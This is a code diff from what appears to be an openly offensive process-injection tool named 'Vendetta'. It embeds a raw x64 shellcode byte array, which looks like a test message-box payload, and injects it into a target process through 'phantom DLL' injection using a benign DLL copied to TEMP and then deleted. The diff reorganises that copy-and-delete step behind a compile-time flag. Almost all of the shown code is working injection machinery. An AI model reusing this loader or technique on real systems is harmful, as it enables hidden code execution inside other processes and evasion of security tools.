@@ -3,7 +3,11 @@
 
 #include "config.h"
 
-static unsigned char buf[320] = {
+#include <filesystem>
+
+namespace
+{
+	unsigned char buf[320] = {
 	0xFC, 0x48, 0x81, 0xE4, 0xF0, 0xFF, 0xFF, 0xFF, 0xE8, 0xCC, 0x00, 0x00,
 	0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B,
 	0x52, 0x60, 0x51, 0x56, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20,
@@ -31,10 +35,8 @@ static unsigned char buf[320] = {
 	0x6C, 0x6C, 0x20, 0x54, 0x65, 0x73, 0x74, 0x00, 0x41, 0x58, 0x48, 0x31,
 	0xC9, 0x41, 0xBA, 0x45, 0x83, 0x56, 0x07, 0xFF, 0xD5, 0x48, 0x31, 0xC9,
 	0x41, 0xBA, 0xF0, 0xB5, 0xA2, 0x56, 0xFF, 0xD5
-};
+	};
 
-namespace
-{
 	int ProxyThread()
 	{
 		DWORD pId = Vendetta::FindProcessId(TARGET);
@@ -51,23 +53,41 @@ namespace
 			return 1;
 		}
 
-		wchar_t tempPath[MAX_PATH];
-		GetTempPathW(MAX_PATH, tempPath);
-		const std::wstring targetDll = std::wstring(tempPath) + L"xpsservices.dll";
-
-		CopyFileW(BENIGN_DLL.data(), targetDll.c_str(), FALSE);
-
-		PROCESS_INFORMATION pi;
-		pi.hProcess = hProcess;
-		pi.dwProcessId = pId;
-		if (!Vendetta::InjectPhantomDll(pi, buf, sizeof(buf), targetDll))
+		if constexpr (COPY_AND_DELETE)
 		{
-			Log(LogError, "Injection failed");
-			return 1;
-		}
-		Log(LogInfo, "Injection succeeded");
+			wchar_t tempPath[MAX_PATH];
+			GetTempPathW(MAX_PATH, tempPath);
+			const std::wstring benignDllTempCopy = std::wstring(tempPath) + std::filesystem::path(BENIGN_DLL).filename().wstring();
 
-		DeleteFileW(targetDll.c_str());
+			Log(LogWarn, "Copying {} to TEMP folder", std::string(BENIGN_DLL.begin(), BENIGN_DLL.end()));
+			CopyFileW(BENIGN_DLL.data(), benignDllTempCopy.c_str(), FALSE);
+
+			PROCESS_INFORMATION pi;
+			pi.hProcess = hProcess;
+			pi.dwProcessId = pId;
+			if (!Vendetta::InjectPhantomDll(pi, buf, sizeof(buf), benignDllTempCopy))
+			{
+				Log(LogError, "Injection failed");
+				return 1;
+			}
+			Log(LogInfo, "Injection succeeded");
+
+			Log(LogWarn, "Deleting {}", std::string(benignDllTempCopy.begin(), benignDllTempCopy.end()));
+			DeleteFileW(benignDllTempCopy.c_str());
+		} else
+		{
+			PROCESS_INFORMATION pi;
+			pi.hProcess = hProcess;
+			pi.dwProcessId = pId;
+			if (!Vendetta::InjectPhantomDll(pi, buf, sizeof(buf), BENIGN_DLL))
+			{
+				Log(LogError, "Injection failed");
+				return 1;
+			}
+			Log(LogInfo, "Injection succeeded");
+		}
+
+		
 
 		return 0;
 	}
